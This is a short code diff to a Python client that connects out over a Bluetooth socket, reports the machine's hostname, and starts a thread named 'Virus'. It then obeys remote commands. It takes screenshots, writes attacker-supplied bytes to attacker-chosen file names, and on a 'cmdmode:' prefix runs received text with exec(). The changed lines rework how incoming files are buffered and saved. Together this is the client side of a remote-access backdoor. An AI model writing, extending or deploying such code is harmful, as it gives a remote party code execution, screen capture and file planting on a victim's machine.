@@ -12,7 +12,7 @@ client.connect(("6c:2f:80:71:84:8b", 4))
 client.send(socket.gethostname().encode())
 th = threading.Thread(target=ClientUI.Virus,daemon=True)
 
-ima = b""
+byt = b""
 try:
     while True:
         data = client.recv(9999999999999999)
@@ -22,10 +22,7 @@ try:
         try:
             data = data.decode()
         except Exception as e:
-            with open("img"+str(fileerror)+".png","wb") as file:
-                file.write(ima+data)
-            fileerror += 1
-            continue
+            byt += data
 
         print(data)
         if data == "1":
@@ -35,6 +32,10 @@ try:
         elif data == "3":
             pyautogui.screenshot().save("Screenshot"+str(screeniecounter) + ".png")
             screeniecounter = screeniecounter + 1
+        elif "img" in data:
+            with open(data.split(" ")[1],"wb") as file:
+                file.write(byt)
+            byt = b""
         elif "cmdmode:" in data:
             str.replace('cmdmode:', '')
             exec(data)
